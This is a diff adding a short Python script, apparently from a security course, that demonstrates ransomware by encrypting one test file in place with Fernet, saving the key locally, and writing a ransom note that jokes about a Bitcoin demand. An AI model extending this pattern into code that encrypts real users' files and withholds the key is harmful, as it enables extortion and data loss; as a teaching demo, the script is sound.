@@ -1,0 +1,35 @@
+from cryptography.fernet import Fernet
+import os
+
+# gerando a chave para criptografar
+# a biblioteca cryptography faz o trabalho pesado pra gente
+chave = Fernet.generate_key()
+with open("chave.key", "wb") as arquivo_chave:
+    arquivo_chave.write(chave)
+
+# preparando a ferramenta pra criptografar
+f = Fernet(chave)
+
+# criei esse arquivo de texto antes pra servir de cobaia
+arquivo_alvo = "meus_segredos.txt"
+
+if os.path.exists(arquivo_alvo):
+    # lê os dados originais
+    with open(arquivo_alvo, "rb") as arquivo:
+        dados_originais = arquivo.read()
+
+    # aqui a mágica acontece e o arquivo fica ilegível
+    dados_criptografados = f.encrypt(dados_originais)
+
+    # sobrescreve o arquivo com os dados criptografados
+    with open(arquivo_alvo, "wb") as arquivo:
+        arquivo.write(dados_criptografados)
+
+    # criando a mensagem de resgate clássica
+    with open("RESGATE.txt", "w") as resgate:
+        resgate.write("Atenção! Seus arquivos foram criptografados.\n")
+        resgate.write("Me pague 1 Bitcoin para ter a chave de volta kkkk brincadeira, é só um teste do curso.\n")
+        
+    print("Sucesso! O arquivo foi criptografado e a mensagem de resgate foi criada.")
+else:
+    print("Opa! Cria um arquivo chamado 'meus_segredos.txt' primeiro pra gente poder testar!")
